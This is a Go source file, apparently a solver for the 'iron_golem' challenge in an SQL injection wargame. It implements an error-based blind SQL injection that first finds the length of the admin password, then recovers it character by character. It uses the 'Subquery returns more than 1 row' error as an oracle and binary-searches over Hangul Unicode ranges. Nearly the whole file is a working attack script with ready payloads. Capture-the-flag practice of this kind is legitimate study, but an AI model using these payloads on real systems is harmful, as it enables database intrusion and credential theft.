package problem

import(
	"fmt"
	"strings"
	"strconv"
	"unicode"
)

func find_len7(file, session string) int{
	for length := 0 ; length < 100; length += 1 {
		s_pw := "1' || if((select id='admin' and LENGTH(pw) = " + strconv.Itoa(length) + "), true, (select 1 union select 2)); %23"
		param := map[string]string{
			"pw" : s_pw,
		}
		
		contents := connect(file, param, session)
		if ! strings.Contains(string(contents),"Subquery returns more than 1 row"){
			return length
		}
	}
	return 0
}

func iron_check(file, session string, pos int, chr uint16) bool {
	s_pw := "1' || if((select id='admin' and substr(pw,"+strconv.Itoa(pos)+",1) <= '"+ string(chr) +"'), true, (select 1 union select 2));%23"
	param := map[string]string{
		"pw" : s_pw,
	}
	
	contents := connect(file, param, session)
	if ! strings.Contains(string(contents),"Subquery returns more than 1 row"){
		return true
	}
	return false
}

func bsearch2(file, session string, pos int, lo, hi uint16) uint16 {
	if hi - lo == 1 {
		if iron_check(file, session, pos, lo){
			return lo
		}
		return hi
	}
	center := lo + (hi - lo)/2
	if iron_check(file, session, pos, center){
		return bsearch2(file, session, pos, lo, center)
	}else{
		return bsearch2(file, session, pos, center, hi)
	}
}

func find_pw7(file string, length int, session string)string{
	result := ""
	NEXT_STR:
	for i := 1 ; i <= length/2; i += 1 {
		for _, r := range unicode.Hangul.R16 {			
			if iron_check(file, session, i, r.Lo) != false {
				continue
			}else if iron_check(file, session, i, r.Hi) != true {
				continue
			}
			c := bsearch2(file, session, i, r.Lo, r.Hi)
			result += string(c)
			continue NEXT_STR
		}
	}
	return result
}


func Iron_golem(session string){
	file := "iron_golem_0803cf46da7bda62b328dbfc1d77fe15.php"
	
	length := find_len7(file, session)
	//fmt.Println("Key length is "+ strconv.Itoa(length) + ".")

	pw_str := find_pw7(file,length, session)
	//fmt.Println("pw is "+ pw_str + ".")
		
	param := map[string]string{
		"pw" : pw_str,
	}
	
	contents := connect(file, param, session)
	if strings.Contains(string(contents),"IRON_GOLEM Clear!"){
		fmt.Println("IRON_GOLEM Clear!")
	}
}